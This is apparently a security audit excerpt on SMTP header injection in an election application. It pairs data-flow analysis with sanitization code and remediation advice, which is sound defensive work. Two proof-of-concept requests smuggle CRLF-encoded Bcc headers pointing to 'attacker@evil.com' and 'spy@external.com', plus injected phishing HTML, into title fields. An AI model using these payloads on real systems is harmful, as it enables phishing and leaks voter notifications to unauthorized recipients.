## Findings

### Medium Severity

#### ASVS-1311-MED-001: No SMTP Injection Sanitization Controls for User-Controlled Election Metadata

**Severity:** MEDIUM  
**Finding ID:** ASVS-1311-MED-001  
**Gap Type:** Type A — Entry points with NO control  
**File:** `v3/steve/election.py`, lines 501–507; `v3/server/pages.py`, lines 467–484, 524–544

**Evidence of email functionality:**
```python
# v3/steve/election.py, lines 501-507
def get_voters_for_email(self):
    "Return a list of distinct voters (pid, name, email) eligible for this election."
    self.q_voting_persons.perform(self.eid)
    return [
        edict(pid=row.pid, name=row.name, email=row.email)
        for row in self.q_voting_persons.fetchall()
    ]
```

**User input ingestion with no mail sanitization:**
```python
# v3/server/pages.py, lines 477-479
form = edict(await quart.request.form)
# Create the Election.
election = steve.election.Election.create(DB_FNAME, form.title, result.uid)
```

```python
# v3/steve/election.py, lines 430-434
# No SMTP-specific sanitization of title before storage
db.c_create.perform(eid, title, owner_pid, authz, open_at, close_at)
```

**Data Flow:**
1. **Source:** `form.title` from `POST /do-create-election` (user-controlled web form input)
2. **Storage:** `Election.create()` → `c_create` SQL query stores title in `election` table
3. **Retrieval:** `get_metadata()` returns title; `get_voters_for_email()` provides recipient list
4. **Sink:** Email system (method name and return structure explicitly designed for email dispatch)
5. **Missing Control:** No SMTP header injection sanitization (CRLF filtering, header encoding) anywhere in the chain

**Proof of Concept:**

An authenticated user creating an election could inject SMTP headers via the title field:

```http
POST /do-create-election HTTP/1.1
Content-Type: application/x-www-form-urlencoded

title=Legitimate+Title%0d%0aBcc%3a+attacker%40evil.com%0d%0aContent-Type%3a+text/html%0d%0a%0d%0a<html>Phishing+content</html>&csrf_token=placeholder
```

If the election title is used in an email Subject or body without sanitization, this could:
- Inject additional headers (`Bcc:`, `Cc:`, `To:`)
- Override `Content-Type` for phishing
- Add arbitrary recipients

**Impact:**
- SMTP header injection could allow sending emails to unintended recipients
- Could enable phishing attacks appearing to originate from the legitimate voting system
- Could leak election notification content to unauthorized parties
- Severity is MEDIUM because: (a) the actual email sending code is not in the provided files so full exploitability cannot be confirmed, (b) the attacker must be an authenticated PMC member to create elections, and (c) the email sending implementation may have its own protections

**Remediation:**

Add SMTP-specific sanitization for all user-controlled data before it reaches any email system:

```python
# v3/steve/sanitize.py (new file)
import re

def sanitize_for_email_header(value: str) -> str:
    """Remove CRLF sequences that could enable SMTP header injection."""
    if value is None:
        return None
    # Strip CR, LF, and NULL bytes that enable header injection
    return re.sub(r'[\r\n\x00]', '', value)

def sanitize_for_email_body(value: str) -> str:
    """Sanitize content for use in email body."""
    if value is None:
        return None
    # Remove NULL bytes; CRLF is acceptable in body content
    return value.replace('\x00', '')
```

Apply in `Election.create()`:
```python
from . import sanitize

@classmethod
def create(cls, db_fname, title, owner_pid, authz=None, open_at=None, close_at=None):
    # Sanitize title for potential email use
    sanitized_title = sanitize.sanitize_for_email_header(title)
    db = cls.open_database(db_fname)
    while True:
        eid = crypto.create_id()
        try:
            db.c_create.perform(eid, sanitized_title, owner_pid, authz, open_at, close_at)
            break
        except sqlite3.IntegrityError:
            _LOGGER.debug('EID conflict(!!) ... trying again.')
    return cls(db_fname, eid, op='Opening NEW')
```

Similarly for `add_issue()` and `edit_issue()`:
```python
def add_issue(self, title, description, vtype, kv):
    assert self.is_editable()
    assert vtype in vtypes.TYPES
    sanitized_title = sanitize.sanitize_for_email_header(title)
    sanitized_desc = sanitize.sanitize_for_email_body(description)
    # ... rest of method using sanitized values
```

#### ASVS-1311-MED-002: Issue Title and Description Lack SMTP Sanitization at Form Submission Endpoints

**Severity:** MEDIUM  
**Finding ID:** ASVS-1311-MED-002  
**Gap Type:** Type A — Entry points with NO control  
**File:** `v3/server/pages.py`, lines 534–540 (`do_add_issue_endpoint`) and lines 557–562 (`do_edit_issue_endpoint`)

**Vulnerable code:**
```python
# v3/server/pages.py, lines 534-540 (do_add_issue_endpoint)
form = edict(await quart.request.form)
print('FORM:', form)

### do better with these
vtype = 'yna'
kv = None

iid = election.add_issue(form.title, form.description, vtype, kv)
```

```python
# v3/server/pages.py, lines 557-562 (do_edit_issue_endpoint)
form = edict(await quart.request.form)
print('FORM:', form)

# Update the title/description.
election.edit_issue(issue.iid, form.title, form.description, issue.vtype, issue.kv)
```

**Data Flow:**
1. **Source:** `form.title` and `form.description` from POST form data
2. **Processing:** Passed directly to `election.add_issue()` / `election.edit_issue()`
3. **Storage:** Stored in `issue` table via parameterized query (safe for SQL)
4. **Potential Sink:** Issue titles/descriptions could appear in email notifications to voters
5. **Missing Control:** No CRLF/header injection filtering at any point

**Proof of Concept:**
```http
POST /do-add-issue/VALID_EID HTTP/1.1
Content-Type: application/x-www-form-urlencoded

title=Board+Election%0d%0aBcc%3a+spy%40external.com&description=Normal+description&csrf_token=placeholder
```

**Impact:** 

Same as ASVS-1311-MED-001 — if issue titles are used in email subjects or headers for voter notifications, SMTP header injection becomes possible. An attacker with election management privileges could:
- Inject SMTP headers through issue titles
- Send notifications to unauthorized recipients
- Modify email content-type for phishing attacks
- Leak sensitive election information

**Remediation:** 

Apply `sanitize_for_email_header()` to issue titles and `sanitize_for_email_body()` to descriptions at the form handler level or within `add_issue()`/`edit_issue()` methods as shown in the remediation for ASVS-1311-MED-001.

## Architecture Observations

1. **Email sending code is not in the provided files.** The `get_voters_for_email()` method in `election.py` clearly indicates email notification capability exists, but the SMTP client code, email template construction, and sending logic are not available for review. A complete audit of ASVS 1.3.11 requires access to that code.

2. **No centralized input sanitization layer exists.** The application relies on parameterized queries for SQL safety and EZT escaping for HTML safety, but has no equivalent sanitization layer for email/SMTP contexts. This is an architectural gap — when the email sending code uses election metadata, there's no defense-in-depth.

3. **`form.title` and `form.description` flow through without context-specific encoding.** These values are correctly handled for SQL (parameterized queries) and HTML (EZT escaping), but not for SMTP headers. Since the same data may be used across multiple output contexts, sanitization should occur at storage time for any characters that are dangerous across all contexts (like CRLF for SMTP).

## Recommendations Summary

### Immediate Actions (Priority 1)

| Recommendation | Effort | Impact |
|----------------|--------|--------|
| **Provide email sending code for audit** — The `get_voters_for_email()` method indicates email functionality exists elsewhere. That code must be reviewed for SMTP injection. | Low | Critical for complete ASVS 1.3.11 compliance assessment |
| **Add CRLF sanitization to user-input fields at storage time** — Strip `\r`, `\n`, `\x00` from election titles and issue titles before database storage, as these characters are never legitimate in single-line fields and are dangerous in SMTP headers. | Low | Directly mitigates ASVS-1311-MED-001 and ASVS-1311-MED-002 |

### Short-term Actions (Priority 2)

| Recommendation | Effort | Impact |
|----------------|--------|--------|
| **Create a `sanitize` module** with context-specific sanitization functions (`sanitize_for_email_header`, `sanitize_for_email_body`) as a reusable defense layer. | Medium | Provides architectural foundation for defense-in-depth |
| **Use Python's `email.message` module** (or equivalent) for constructing emails rather than string concatenation, as it provides built-in header encoding and injection protection. | Medium | Industry best practice for email security |

### Long-term Actions (Priority 3)

| Recommendation | Effort | Impact |
|----------------|--------|--------|
| **Add input length limits** on `title` and `description` fields at the web handler level to limit the attack surface for injection payloads. | Low | Additional defense-in-depth measure |
